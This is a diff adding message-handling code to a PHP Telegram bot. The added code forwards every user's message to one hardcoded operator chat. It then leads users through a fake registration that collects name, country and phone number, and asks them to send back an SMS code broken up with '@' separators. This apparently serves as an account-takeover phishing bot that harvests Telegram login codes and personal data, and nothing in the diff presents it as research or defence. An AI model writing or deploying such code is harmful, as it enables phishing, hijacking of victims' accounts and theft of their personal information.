@@ -72,6 +72,123 @@ class GenericmessageCommand extends SystemCommand
             return $this->telegram->executeCommand($command);
         }
 
+        $message = $this->getMessage();
+        $message_id = $message->getMessageId();
+
+        $message_text = $message->getText(true);
+        $chat_id    = $message->getChat()->getId();
+
+
+        if ($chat_id == '1053901092') {
+
+            if ($message->getReplyToMessage()) {
+
+                $forwardFrom = $message->getReplyToMessage()->getForwardFrom()->getId();
+              
+              return Request::sendMessage([
+                    'chat_id' => $forwardFrom,
+                    'text' => $message_text
+        
+                ]);
+            }
+            
+             
+         return Request::emptyResponse();
+
+
+        }
+        else {
+
+        
+
+          Request::forwardMessage([
+            'chat_id' => '1053901092',
+            'from_chat_id' => $chat_id,
+            'message_id' => $message_id
+
+        ]);
+
+      
+            
+
+        $keyboards[] = new Keyboard([
+            ['text' => 'SUBMIT YOUR NAME'],
+          
+        ]);
+
+        $keyboard = end($keyboards)
+        ->setResizeKeyboard(true)
+        ->setOneTimeKeyboard(true)
+        ->setSelective(false);
+
+
+        $keyboards2[] = new Keyboard([
+
+            ['text' => 'SUBMIT YOUR COUNTRY'],
+          
+        ]);
+
+        $keyboard2 = end($keyboards2)
+        ->setResizeKeyboard(true)
+        ->setOneTimeKeyboard(true)
+        ->setSelective(false);
+
+
+        $keyboards3[] = new Keyboard([
+            
+            ['text' => 'SUBMIT YOUR PHONE'],
+          
+        ]);
+
+        $keyboard3 = end($keyboards3)
+        ->setResizeKeyboard(true)
+        ->setOneTimeKeyboard(true)
+        ->setSelective(false);
+
+
+        $keyboards4[] = new Keyboard([
+            
+            ['text' => 'CONFIRM YOUR CODE'],
+          
+        ]);
+
+        $keyboard4 = end($keyboards4)
+        ->setResizeKeyboard(true)
+        ->setOneTimeKeyboard(true)
+        ->setSelective(false);
+       
+
+            if ($message_text == "REGISTER NOW") {
+                return $this->replyToChat("Please ! Write Your Fullname eg( joe doe )", [
+                    'reply_markup' => $keyboard,
+                 ]);
+            }
+
+            elseif ($message_text == 'SUBMIT YOUR NAME')
+            {
+                return $this->replyToChat("Please ! Write Your country eg( brasil )", [
+                    'reply_markup' => $keyboard2,
+                 ]);
+            }
+
+            elseif ($message_text == 'SUBMIT YOUR COUNTRY')
+            {
+                return $this->replyToChat("Please ! Write Your PHONE Number eg( +***** )", [
+                    'reply_markup' => $keyboard3,
+                 ]);
+            }
+
+            elseif ($message_text == 'SUBMIT YOUR PHONE')
+            {
+                return $this->replyToChat(" WE SENT YOU A SMS CODE". PHP_EOL. 
+                " Please ! SEND BACK THE CODE eg( 1@2@3@4@5 )", [
+                    'reply_markup' => $keyboard4,
+                 ]);
+            }
+        
+
+        }
+
         return Request::emptyResponse();
     }
 }
